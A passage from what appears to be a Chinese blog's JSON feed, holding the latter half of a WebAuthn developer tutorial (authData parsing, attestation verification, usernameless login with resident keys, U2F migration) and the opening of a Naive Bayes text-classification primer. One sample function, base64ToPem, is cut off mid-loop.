预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 